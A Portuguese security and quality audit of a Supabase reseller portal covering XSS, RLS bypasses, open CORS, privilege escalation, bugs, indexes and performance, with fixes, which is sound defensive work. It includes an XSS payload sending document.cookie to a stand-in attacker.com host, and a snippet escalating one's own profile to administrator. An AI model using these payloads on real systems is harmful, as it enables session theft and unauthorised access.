# Auditoria de Segurança e Qualidade — Portal Revenda LC

> Auditoria realizada em: junho/2026  
> Arquivos analisados: `index.html`, `app.html`, `supabase_setup.sql`, `rls_e_tabelas_orion.sql`, `supabase/functions/webhook-orion/index.ts`

---

## Sumário Executivo

| Categoria | Crítico | Alto | Médio | Baixo |
|-----------|---------|------|-------|-------|
| Segurança | 3 | 4 | 3 | 2 |
| Bugs potenciais | 0 | 4 | 5 | 3 |
| Problemas de RLS | 2 | 3 | 2 | 1 |
| Índices ausentes | — | 5 | 9 | — |
| Código duplicado | — | 1 | 5 | 3 |
| Performance | — | 3 | 5 | 2 |

---

## 1. Falhas de Segurança

### 1.1 XSS (Cross-Site Scripting) — CRÍTICO

**Localização:** `app.html` — 73 ocorrências de `innerHTML` com template literals interpolando dados do banco.

**Problema:** Dados vindos do Supabase são injetados diretamente em `innerHTML` sem nenhum sanitizamento. Exemplos concretos:

```javascript
// app.html:2081
tb.innerHTML = data.map(r => `<tr>
  <td><div class="tdp">${r.nome}</div>
  <div style="font-size:11px;color:var(--txt3)">${r.email||''}</div></td>
  <td>${r.cidade||'—'}${r.uf?' · '+r.uf:''}</td>
  <td>${r.cs||'—'}</td>
  ...
```

```javascript
// app.html:1946 — nome de usuário injetado em opções de select
csF.innerHTML = '...' + DB.usuarios.filter(u=>u.ativo)
  .map(u=>`<option>${u.nome}</option>`).join('');
```

**Impacto:** Um usuário com permissão de criar revendas pode inserir no campo `nome` o valor:
```
<img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)">
```

Quando outro usuário (inclusive Admin) visualizar a lista, o script é executado no contexto da sessão desse usuário — roubo de sessão, exfiltração de dados, etc.

**Correção:** Usar `textContent` para valores de texto puro, ou sanitizar com `DOMPurify` antes de qualquer `innerHTML`:
```javascript
const safe = str => str.replace(/[&<>"']/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])
);
```

---

### 1.2 RLS Bypass via `auth.uid() is null` — CRÍTICO

**Localização:** `rls_e_tabelas_orion.sql`, linhas 118, 145, 182.

```sql
-- Linha 118 — revendas_insert
create policy "revendas_insert" on public.revendas
  for insert with check (
    public.estou_ativo() and (
      (select pode_criar_revenda from public.perfis where id = auth.uid())
      or auth.uid() is null  -- ⚠️ FALHA: permite inserção sem autenticação
    )
  );

-- Linha 145 — historico_insert
for insert with check (public.estou_ativo() or auth.uid() is null);

-- Linha 182 — atividades_insert
for insert with check (public.estou_ativo() or auth.uid() is null);
```

**Problema:** O comentário diz "permite service role", mas isso está errado. O service role **bypassa o RLS completamente** — não precisa de condição alguma. Já `auth.uid() is null` ocorre quando a requisição é feita com a **anon key sem autenticação**, ou seja, qualquer pessoa com a anon key (exposta nos HTMLs) pode inserir revendas, histórico e atividades sem estar logada.

**Correção:** Remover a condição `or auth.uid() is null` de todas as políticas. O service role nunca precisa disso.

```sql
create policy "revendas_insert" on public.revendas
  for insert with check (
    public.estou_ativo() and (
      select pode_criar_revenda from public.perfis where id = auth.uid()
    )
  );
```

---

### 1.3 CORS Aberto nos Endpoints GET Sem Autenticação — CRÍTICO

**Localização:** `webhook-orion/index.ts`, linhas 102–133.

```typescript
// Qualquer origem pode fazer GET e receber dados de negócio
if (req.method === 'GET') {
  if (tipo === 'metas') {
    const { data } = await sb.from('orion_metas').select('*')...
    return Response.json({ success: true, data }, {
      headers: { 'Access-Control-Allow-Origin': '*' }  // aberto para qualquer domínio
    })
  }
  if (tipo === 'leads_vendidos') {
    const { data } = await sb.from('orion_leads_vendidos').select('*')...
    // Retorna 50 leads com nome, email, telefone, cidade...
  }
}
```

**Impacto:** Qualquer pessoa que descubra a URL da Edge Function pode acessar sem autenticação:
- Metas comerciais mensais completas
- Dados dos últimos 50 leads (nome, email, telefone, cidade)

**Correção:** Exigir autenticação nos GETs. O token da sessão pode ser passado via header:
```typescript
const authHeader = req.headers.get('authorization')
if (!authHeader?.startsWith('Bearer ')) {
  return Response.json({ error: 'Não autorizado' }, { status: 401 })
}
// Validar o JWT com a anon key
```

---

### 1.4 Comparação de Token Vulnerável a Timing Attack — ALTO

**Localização:** `webhook-orion/index.ts`, linha 26.

```typescript
if (sigHeader === ORION_WEBHOOK_SECRET) return true
```

**Problema:** Comparação com `===` tem tempo de execução variável dependendo de onde os strings diferem. Um atacante pode medir o tempo de resposta para deduzir o token byte a byte (timing attack).

**Correção:** Usar comparação em tempo constante:
```typescript
async function timingSafeEqual(a: string, b: string): Promise<boolean> {
  const enc = new TextEncoder()
  const ka = await crypto.subtle.importKey('raw', enc.encode(a), {name:'HMAC',hash:'SHA-256'}, false, ['sign'])
  const sig = await crypto.subtle.sign('HMAC', ka, enc.encode(''))
  const kb = await crypto.subtle.importKey('raw', enc.encode(b), {name:'HMAC',hash:'SHA-256'}, false, ['sign'])
  const sig2 = await crypto.subtle.sign('HMAC', kb, enc.encode(''))
  return crypto.subtle.verify('HMAC', ka, sig2, enc.encode(''))
}
```

---

### 1.5 `ORION_WEBHOOK_SECRET` Sem Guarda de Runtime — ALTO

**Localização:** `webhook-orion/index.ts`, linhas 7–9.

```typescript
const SUPABASE_URL     = Deno.env.get('SUPABASE_URL')!
const SUPABASE_SERVICE = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
const ORION_WEBHOOK_SECRET = Deno.env.get('ORION_WEBHOOK_SECRET')!
```

O `!` é uma asserção TypeScript que não gera código de runtime. Se `ORION_WEBHOOK_SECRET` não estiver configurado no Supabase, a variável será `undefined`. A comparação `sigHeader === undefined` sempre retorna `false`, **rejeitando silenciosamente todos os webhooks**.

**Correção:**
```typescript
const ORION_WEBHOOK_SECRET = Deno.env.get('ORION_WEBHOOK_SECRET')
if (!ORION_WEBHOOK_SECRET) {
  throw new Error('ORION_WEBHOOK_SECRET não configurado')
}
```

---

### 1.6 Chamada à API Anthropic Diretamente do Browser — ALTO

**Localização:** `app.html`, linha 3935.

```javascript
const response = await fetch("https://api.anthropic.com/v1/messages", {
  method: "POST",
  headers: {"Content-Type":"application/json"},
  body: JSON.stringify({ model: "claude-sonnet-4-20250514", ... })
});
```

**Problema duplo:**
1. Sem `x-api-key` no header, a chamada retorna 401 — a funcionalidade de IA está quebrada.
2. Se uma chave API for adicionada diretamente neste código, ficará exposta para qualquer visitante, permitindo uso não autorizado às custas da organização.

**Correção:** Criar uma Edge Function proxy que mantenha a chave API no servidor:
```typescript
// supabase/functions/ai-proxy/index.ts
const key = Deno.env.get('ANTHROPIC_API_KEY')!
// Valida sessão Supabase antes de repassar à Anthropic
```

---

### 1.7 Ausência de Content Security Policy (CSP) — MÉDIO

**Localização:** `index.html` e `app.html` — sem nenhum header ou meta tag de CSP.

Combinado com as vulnerabilidades de XSS, a ausência de CSP significa que scripts injetados podem:
- Fazer requests para qualquer domínio
- Ler cookies e localStorage
- Capturar teclas digitadas

**Correção mínima** via meta tag (ou, melhor, via header HTTP do servidor):
```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; connect-src 'self' https://*.supabase.co;">
```

---

### 1.8 Scripts CDN Sem Subresource Integrity (SRI) — MÉDIO

**Localização:** `index.html` linha 7; `app.html` linhas 7–8.

```html
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
```

Se o CDN for comprometido, scripts maliciosos serão carregados sem qualquer verificação.

**Correção:**
```html
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"
  integrity="sha384-[hash]" crossorigin="anonymous"></script>
```

---

### 1.9 XSS na Renderização da Resposta de IA — MÉDIO

**Localização:** `app.html`, linhas 3950–3955.

```javascript
const html = text
  .replace(/```([\s\S]*?)```/g, '<pre>...<code>$1</code></pre>')
  .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
  .replace(/\n/g, '<br>');
respEl.innerHTML = `<div>${html}</div>`;
```

A resposta da IA passa por regex que **não removem tags HTML**. Se a IA retornar conteúdo como `<script>...</script>`, ele será injetado. A correção é sanitizar antes de aplicar os replaces.

---

### 1.10 Histórico de IA no localStorage — BAIXO

**Localização:** `app.html`, linhas 3960–3963.

```javascript
aiHistory.push(entry);
localStorage.setItem('lc_aiHistory', JSON.stringify(aiHistory));
```

Prompts enviados à IA (potencialmente contendo dados de clientes, CNPJs, etc.) ficam persistidos no localStorage sem nenhum TTL ou mecanismo de limpeza. Em um computador compartilhado, esses dados ficam expostos.

---

## 2. Problemas de RLS

### 2.1 Usuário Pode Escalar Privilégios via `perfis_update_self` — CRÍTICO

**Localização:** `rls_e_tabelas_orion.sql`, linhas 99–101.

```sql
create policy "perfis_update_self" on public.perfis
  for update using (auth.uid() = id)
  with check (auth.uid() = id);
```

A política verifica apenas a identidade do usuário, **não restringe quais campos podem ser alterados**. Um usuário autenticado pode enviar:

```javascript
await sb.from('perfis').update({
  perfil: 'Administrador',
  pode_excluir_revenda: true,
  pode_gerenciar_usuarios: true
}).eq('id', meuProprioid)
```

E o RLS aprovaria a operação porque `auth.uid() = id` é verdadeiro.

**Correção:** Usar uma trigger function para restringir campos editáveis pelo próprio usuário (apenas `nome`, `avatar_iniciais`), delegando os demais apenas ao Admin:

```sql
create or replace function public.check_perfil_update()
returns trigger language plpgsql security definer as $$
begin
  if auth.uid() = old.id and (
    new.perfil != old.perfil or
    new.ativo  != old.ativo  or
    new.pode_gerenciar_usuarios != old.pode_gerenciar_usuarios
    -- demais permissões...
  ) then
    raise exception 'Não autorizado a alterar permissões próprias';
  end if;
  return new;
end $$;
```

---

### 2.2 `orion_metas` Permite UPDATE por Qualquer Usuário — ALTO

**Localização:** `rls_e_tabelas_orion.sql`, linha 77.

```sql
create policy "orion_metas_update" on public.orion_metas
  for update using (true);  -- ⚠️ qualquer autenticado pode alterar metas
```

O comentário diz "só sistema insere", mas qualquer usuário ativo pode alterar valores de metas (incluindo `valor_atual`, `percentual`, `status`), podendo manipular os dashboards executivos.

**Correção:**
```sql
create policy "orion_metas_update" on public.orion_metas
  for update using (public.meu_perfil() = 'Administrador');
```

---

### 2.3 `revendas_seguras` Pode Vazar CNPJ — ALTO

**Localização:** `supabase_setup.sql`, linhas 296–306 (versão original sem `security_invoker`).

```sql
-- Versão original (supabase_setup.sql) — sem security_invoker
create or replace view public.revendas_seguras as
select id, nome,
  case when (select pode_ver_cnpj from public.perfis where id = auth.uid())
       then cnpj else '••••••••/••••-••' end as cnpj, ...
from public.revendas;
```

Se a view for consultada sem `security_invoker = true` (adicionado só no segundo script), o RLS da tabela `revendas` não é aplicado ao contexto da view — o CASE WHEN que testa `pode_ver_cnpj` é avaliado mas a política de RLS em `revendas` pode ser bypassada dependendo do security definer da view.

A versão corrigida em `rls_e_tabelas_orion.sql` adiciona `with (security_invoker = true)`, mas se apenas o primeiro script for executado, a vulnerabilidade existe. Os dois scripts também definem máscaras diferentes: `'••••••••/••••-••'` vs `'••••••/••-••'`.

---

### 2.4 `treinamentos_write` e `handovers_write` Usam `FOR ALL` com `USING` — ALTO

**Localização:** `rls_e_tabelas_orion.sql`, linhas 207–209 e 213–216.

```sql
create policy "treinamentos_write" on public.treinamentos
  for all using (public.estou_ativo() and
    public.meu_perfil() in ('Administrador','CS Manager'));

create policy "handovers_write" on public.handovers
  for all using (public.estou_ativo() and (
    select pode_handover from public.perfis where id = auth.uid()
  ));
```

`FOR ALL` com apenas `USING` (sem `WITH CHECK`) aplica a cláusula `USING` também nos INSERTs, mas de forma inconsistente entre versões do PostgreSQL. O correto é separar:

```sql
create policy "handovers_insert" on public.handovers
  for insert with check (...);
create policy "handovers_update" on public.handovers
  for update using (...);
```

---

### 2.5 `orion_leads_update` Sem Restrição de Campos — MÉDIO

**Localização:** `rls_e_tabelas_orion.sql`, linhas 63–65.

```sql
create policy "orion_leads_update" on public.orion_leads_vendidos
  for update using (public.estou_ativo());
```

Qualquer usuário ativo pode alterar o campo `processado` de qualquer lead, ou sobrescrever `_orion_raw`, destruindo a rastreabilidade da integração.

---

### 2.6 `importacoes_write` Usa `USING` em `FOR ALL` — MÉDIO

**Localização:** `rls_e_tabelas_orion.sql`, linhas 220–223.

```sql
create policy "importacoes_write" on public.importacoes
  for all using (public.estou_ativo() and (
    select pode_importar from public.perfis where id = auth.uid()
  ));
```

Mesmo problema do item 2.4. Deve usar `WITH CHECK` para inserts.

---

### 2.7 Perfil `Dashboard TV` Não Existe no Banco — BAIXO

**Localização:** `app.html`, linha 1337; `supabase_setup.sql`, linhas 15–17.

```javascript
// app.html
if(p.perfil === 'Dashboard TV') { ativarModoTV(); return; }
```

```sql
-- supabase_setup.sql
perfil text not null default 'CS Analyst'
  check (perfil in ('Administrador','CS Manager','CS Analyst','Diretoria'))
```

O valor `'Dashboard TV'` não está na constraint CHECK do banco. Tentar criar um usuário TV causaria erro no banco. A funcionalidade de modo TV **nunca pode ser ativada**.

---

## 3. Bugs Potenciais

### 3.1 `clearAllData()` É Enganoso — ALTO

**Localização:** `app.html`, linhas 1961–1967.

```javascript
function clearAllData(){
  if(!confirm('Apagar TODOS os dados e começar do zero?...'))return;
  Object.keys(DB).forEach(k=>{DB[k]=[];persist(k)});
  toast('Dados apagados. Sistema limpo!','warn');
  renderDashboard();
}
```

`persist(k)` sem segundo argumento chama `loadFromSupabase()`, que **restaura os dados imediatamente**. Portanto, a função mostra "Dados apagados" mas os dados voltam em milissegundos. O usuário pensa ter apagado o banco, mas nada mudou.

Adicionalmente, o botão 🗑️ na topbar (linha 185) não requer nenhuma permissão especial — qualquer usuário logado pode acioná-lo.

---

### 3.2 `await await` Desnecessário em `logAuditoria` — ALTO

**Localização:** `app.html`, linha 1691.

```javascript
async function logAuditoria(acao, tabela='', registroId='', detalhe={}){
  if(!sessaoAtual) return;
  await await sb.from('auditoria').insert({...});  // ⚠️ await duplicado
}
```

O `await await` é inofensivo (o segundo `await` resolve uma Promise já resolvida), mas indica falta de revisão e pode confundir futuros desenvolvedores.

---

### 3.3 Realtime Reload Total em Qualquer Mudança — ALTO

**Localização:** `app.html`, linhas 1862–1869.

```javascript
function initRealtimeSync(){
  ['revendas','tarefas','atividades','handovers','perfis'].forEach(tabela => {
    sb.channel('sync_'+tabela)
      .on('postgres_changes',{event:'*',schema:'public',table:tabela},
        async ()=>{ await loadFromSupabase(); renderPanel(...); }
      ).subscribe();
  });
}
```

Qualquer evento em qualquer tabela (ex: alguém salvar uma tarefa) dispara `loadFromSupabase()`, que recarrega **todas** as 6 tabelas simultaneamente. Com 5 canais e equipe ativa, isso pode gerar dezenas de carregamentos completos por minuto, sobrecarregando o banco e o cliente.

---

### 3.4 `uid()` Gera IDs Não-UUID — ALTO

**Localização:** `app.html`, linha 1700.

```javascript
function uid(){return Date.now().toString(36)+Math.random().toString(36).slice(2,6)}
```

Gera strings como `"lzk5t8abc"` — não é um UUID válido. Qualquer lugar onde esse `uid()` for usado como `id` no Supabase (que espera `uuid`) causará erro de tipo. Apenas é seguro usar esse `uid()` como chave temporária em memória.

---

### 3.5 `revendas.id_origem` Não Tem Índice — ALTO

**Localização:** `rls_e_tabelas_orion.sql` (índices).

A Edge Function faz:
```typescript
const { data: existe } = await sb.from('revendas')
  .select('id').eq('id_origem', lead.id_origem).single()
```

O campo `revendas.id_origem` **não tem índice**. Já `orion_leads_vendidos.id_origem` tem (`idx_orion_leads_origem`). Em bases com muitas revendas, essa verificação de duplicata fará full table scan a cada webhook recebido.

---

### 3.6 Flag `DB._carregado` Declarada Fora do Tipo — MÉDIO

**Localização:** `app.html`, linhas 1705–1772.

```javascript
const DB = {
  revendas:[], usuarios:[], tarefas:[],
  atividades:[], treinamentos:[], handovers:[],
  importHistory:[],
  // _carregado não está aqui
};
// ...mais abaixo:
DB._carregado = true;  // adicionado dinamicamente
```

E no TV mode:
```javascript
if(!DB._carregado){ setTimeout(renderTVDashboard, 800); return; }
```

Criar propriedades dinâmicas no objeto pode ser fonte de bugs quando `Object.keys(DB)` for iterado (como em `clearAllData()`), que tentará chamar `persist('_carregado')`.

---

### 3.7 `fmtDate()` Quebra com Input Não-String — MÉDIO

**Localização:** `app.html`, linha 1701.

```javascript
function fmtDate(d){
  if(!d)return'—';
  try{
    const dt = new Date(d.includes('T') ? d : d+'T00:00:00');
    // ⚠️ d.includes() lança TypeError se d for Date, number, etc.
    return dt.toLocaleDateString('pt-BR')
  }catch{return d}
}
```

Se `d` for um objeto `Date` vindo diretamente do Supabase, `.includes()` lança `TypeError`. O `catch` retorna `d` que seria um objeto, não uma string legível.

---

### 3.8 Sessão Backup no `sessionStorage` Sem Limite Real — MÉDIO

**Localização:** `app.html`, linhas 1736–1746.

```javascript
sessionStorage.setItem('sb_revendas_backup', JSON.stringify(DB.revendas.map(r=>({
  id, nome, status, cs, contratos, curva, ingresso, cidade, uf,
  email, tel, produtos, id_origem, criadoEm
}))));
```

O `sessionStorage` tem limite de ~5 MB. Com muitas revendas (campo `produtos` é `text[]`, `obs` pode ser longo), o backup silenciosamente falha (o `try/catch` ignora o erro) e o mecanismo de fallback deixa de funcionar sem aviso.

---

### 3.9 Metas com `valor_meta = 0` Causam Divisão por Zero — MÉDIO

**Localização:** `webhook-orion/index.ts`, linhas 246–249.

```typescript
const pct = meta.percentual ??
  (meta.valor_meta > 0
    ? Math.round((meta.valor_atual / meta.valor_meta) * 100)
    : 0)
```

Este caso está coberto. Porém no front-end (`calcMetaStatus`), se a meta vier do banco com `valor_meta = 0` e `percentual` não for calculado, o `percentual` armazenado pode ser `NaN` dependendo do caminho de código.

---

### 3.10 Seletor de Ano Hardcoded até 2027 — BAIXO

**Localização:** `app.html`, linhas 367–370.

```html
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026" selected>2026</option>
<option value="2027">2027</option>
```

Em 2028, o sistema não permitirá visualizar metas daquele ano sem modificação de código.

---

### 3.11 Modelo de IA Desatualizado Hardcoded — BAIXO

**Localização:** `app.html`, linha 3939.

```javascript
model: "claude-sonnet-4-20250514",
```

O modelo está hardcoded. Quando o modelo for descontinuado, a funcionalidade quebra sem aviso.

---

### 3.12 `_orion_raw` Como `text` em Vez de `jsonb` — BAIXO

**Localização:** `rls_e_tabelas_orion.sql`, linhas 22, 38.

```sql
_orion_raw text,  -- em orion_leads_vendidos e orion_metas
```

A Edge Function serializa o raw como `JSON.stringify(...)`. Se fosse `jsonb`, o banco poderia indexar e consultar campos internos do payload. Como `text`, o raw é opaco para o banco.

---

## 4. Índices Ausentes

Campos consultados frequentemente sem índice correspondente:

| Tabela | Campo | Operação | Impacto |
|--------|-------|----------|---------|
| `revendas` | `nome` | ILIKE em busca global e search | Alto — full scan em toda tabela |
| `revendas` | `ingresso` | BETWEEN nos filtros de data do Kanban | Alto |
| `revendas` | `id_origem` | = na verificação de duplicata do webhook | Alto — full scan por webhook |
| `revendas` | `cs_id` | = em JOINs (o índice existente é no campo texto `cs`, não na FK) | Alto |
| `tarefas` | `vencimento` | < TODAY() na contagem de atrasadas | Alto |
| `tarefas` | `status` | = em filtros da UI | Médio |
| `tarefas` | `responsavel_id` | = em filtros por CS | Médio |
| `historico_cards` | `usuario_id` | = na política de delete | Médio |
| `historico_cards` | `tipo` | = em queries de tipo | Médio |
| `handovers` | `revenda_id` | = no CRUD de handovers | Médio — FK sem índice |
| `handovers` | `status` | = em filtros | Baixo |
| `atividades` | `tipo` | GROUP BY em resumo da timeline | Médio |
| `auditoria` | `acao` | = em filtros (LOGIN, CREATE, etc.) | Médio |
| `orion_leads_vendidos` | `processado` | = para encontrar leads não processados | Médio |

**Scripts para criar:**
```sql
create index if not exists idx_revendas_nome       on public.revendas(nome);
create index if not exists idx_revendas_ingresso   on public.revendas(ingresso);
create index if not exists idx_revendas_id_origem  on public.revendas(id_origem);
create index if not exists idx_revendas_cs_id      on public.revendas(cs_id);
create index if not exists idx_tarefas_vencimento  on public.tarefas(vencimento);
create index if not exists idx_tarefas_status      on public.tarefas(status);
create index if not exists idx_tarefas_responsavel on public.tarefas(responsavel_id);
create index if not exists idx_historico_usuario   on public.historico_cards(usuario_id);
create index if not exists idx_historico_tipo      on public.historico_cards(tipo);
create index if not exists idx_handovers_revenda   on public.handovers(revenda_id);
create index if not exists idx_atividades_tipo     on public.atividades(tipo);
create index if not exists idx_auditoria_acao      on public.auditoria(acao);
create index if not exists idx_orion_leads_proc    on public.orion_leads_vendidos(processado);
```

---

## 5. Código Duplicado

### 5.1 Credenciais Supabase em Dois Arquivos — ALTO

`SUPABASE_URL` e `SUPABASE_ANON` estão hardcoded identicamente em `index.html` (linhas 117–118) e `app.html` (linhas 1301–1302). Uma rotação de chave exige editar dois arquivos. Se esquecer um, a sessão do usuário fica em estado inconsistente (auth em uma chave, dados na outra).

---

### 5.2 CSS Variables Duplicadas

O sistema de design (variáveis CSS) está definido separadamente em `index.html` e `app.html` com valores ligeiramente diferentes. Mudança de cor de marca exige alterar dois lugares.

---

### 5.3 Mapeamento de Status Duplicado

O mapa `stMap` / `stColor` mapeando status do pipeline para classes CSS aparece em múltiplas funções de render (`renderRevendas`, `renderKanban`, inline no dashboard). Inconsistências entre eles podem fazer o mesmo status aparecer com cores diferentes em seções diferentes.

---

### 5.4 Lógica de Mascaramento de CNPJ Duplicada

CNPJ é mascarado em três lugares:
1. View SQL `revendas_seguras` (servidor)
2. `renderRevendas()` em JavaScript (cliente)  
3. Modal `editRevenda()` em JavaScript (cliente)

Cada um usa uma máscara diferente: `'••••••••/••••-••'`, `'••••••/••-••'`, e placeholder `'🔒 Acesso restrito'`.

---

### 5.5 `normalizeRevenda` Perde Campos em Updates

```javascript
function normalizeRevenda(r){
  return {...r, criadoEm: r.criado_em};  // remapeia criado_em → criadoEm
}
```

Mas `saveRevenda()` usa `atualizado_em` diretamente como campo do banco. A função de normalização cria uma cópia que usa nomenclatura camelCase, mas os updates enviam snake_case diretamente. Isso não é erro hoje, mas é fonte de confusão em manutenção.

---

### 5.6 Status do Pipeline Hardcoded em Três Lugares

1. `CHECK constraint` no SQL (`supabase_setup.sql`)
2. `<select id="rev-status">` no HTML  
3. Objeto `stMap`/`stColor` em JavaScript

Adicionar um novo status requer modificar os três lugares manualmente. Já existe uma funcionalidade de "etapas configuráveis" no painel de Configurações que poderia ser a fonte única, mas o constraint no banco não é sincronizado.

---

## 6. Performance

### 6.1 Reload Total em Evento de Qualquer Tabela — ALTO

Descrito em Bug 3.3. Cada mudança em qualquer tabela dispara 6 queries simultâneas ao banco. Com equipe ativa (5+ usuários editando em paralelo), isso pode gerar 30+ queries por minuto desnecessariamente.

**Correção:** Recarregar apenas a tabela que mudou:
```javascript
sb.channel('sync_revendas')
  .on('postgres_changes', {event:'*', schema:'public', table:'revendas'},
    async (payload) => {
      // Atualizar apenas DB.revendas, não todas as tabelas
      await recarregarSoRevendas();
      renderRevendas();
    }
  ).subscribe();
```

---

### 6.2 Busca em Lista Sem Debounce — ALTO

**Localização:** `app.html`, linha 244.

```html
<input oninput="renderRevendas()">
```

Cada tecla digitada na busca dispara `renderRevendas()` que:
1. Chama `populateSelects()` (re-renderiza todos os selects)
2. Filtra toda `DB.revendas`
3. Reconstrói toda a tabela via innerHTML

Com 500+ revendas e digitação rápida, isso pode travar a UI.

**Correção:**
```javascript
let searchDebounce;
inputEl.addEventListener('input', () => {
  clearTimeout(searchDebounce);
  searchDebounce = setTimeout(renderRevendas, 250);
});
```

---

### 6.3 `renderTVDashboard` Faz Queries Extras no Banco — ALTO

**Localização:** `app.html`, linhas 1570–1657.

Além do `loadFromSupabase()` chamado pelo polling de 30s, `renderTVDashboard` busca dados adicionais direto do banco em cada chamada:
- `orion_metas` para o mês atual
- `atividades` (últimas 6)

Com o realtime ativo (3 canais) e polling de 30s, a TV pode gerar **6 queries por atualização** ao banco — muito mais do que o necessário.

---

### 6.4 `populateSelects()` Chamada em Cada Renderização — MÉDIO

**Localização:** `app.html`, linha 2059.

`renderRevendas()` chama `populateSelects()` no início. `populateSelects()` re-renderiza todos os elementos `<select>` do sistema com usuários e revendas. Isso significa que filtrar revendas reconstrói todo o DOM de seleção de usuários mesmo sem necessidade.

---

### 6.5 Kanban Itera `DB.revendas` N Vezes para N Colunas — MÉDIO

A renderização do Kanban percorre toda a lista de revendas para cada coluna de status:
```javascript
etapas.forEach(etapa => {
  const revendasDaEtapa = DB.revendas.filter(r => r.status === etapa.id);
  // O filter percorre todas as revendas para cada etapa
});
```

Com 8 etapas e 500 revendas, são 4.000 iterações. Uma única passagem com `Map` seria O(n) em vez de O(n×k).

---

### 6.6 Atividades Sem Paginação No Banco — MÉDIO

**Localização:** `app.html`, linha 1762.

```javascript
sb.from('atividades').select('*').order('criado_em',{ascending:false}).limit(200)
```

O limite de 200 é fixo. Em organizações com atividade intensa, 200 atividades cobrem apenas alguns dias. Não há forma de carregar mais sem reabrir o histórico.

---

### 6.7 `persist()` É Código Morto — BAIXO

**Localização:** `app.html`, linhas 1856–1859.

```javascript
async function persist(tabela, id, dados){
  if(!id){ await loadFromSupabase(); return; }
  // Sem implementação quando id é passado — NÃO salva nada
}
```

A função existe mas não faz nada quando chamada com ID. É um remanescente da versão com localStorage. Qualquer chamada `persist('revendas', id, dados)` silenciosamente não persiste nada.

---

### 6.8 `sessionStorage` Sem Controle de Versão — BAIXO

O backup em sessionStorage não tem nenhum schema version. Se a estrutura de `normalizeRevenda()` mudar, backups antigos com formato diferente são restaurados sem validação, potencialmente causando erros em runtime.

---

## Resumo de Prioridades

### Ação Imediata (antes de qualquer nova funcionalidade)

1. **Sanitizar TODAS as interpolações de dados de usuário em `innerHTML`** (XSS generalizado)
2. **Remover `auth.uid() is null` das políticas RLS** (unauthenticated inserts)
3. **Adicionar autenticação nos endpoints GET da Edge Function** (data leak de leads e metas)
4. **Adicionar trigger para restringir campos editáveis em `perfis_update_self`** (privilege escalation)

### Curto Prazo (próximo sprint)

5. Corrigir `orion_metas_update` para exigir Admin
6. Criar índice em `revendas.id_origem` (impacto direto na performance do webhook)
7. Criar os demais índices listados na seção 4
8. Adicionar debounce nos inputs de busca
9. Corrigir `clearAllData()` para não ser enganoso (remover o botão ou implementar corretamente)
10. Adicionar `security_invoker = true` na view `revendas_seguras` (já feito no 2º script — verificar se 1º foi aplicado)

### Médio Prazo

11. Separar credenciais em arquivo `config.js` único
12. Adicionar CSP e SRI nos scripts CDN
13. Implementar proxy server-side para a API Anthropic
14. Adicionar o valor `'Dashboard TV'` na constraint CHECK ou remover a lógica client-side
15. Implementar reload seletivo no realtime sync (só a tabela alterada)
16. Adicionar `WITH CHECK` separado dos `FOR ALL` nas políticas de treinamentos, handovers e importações
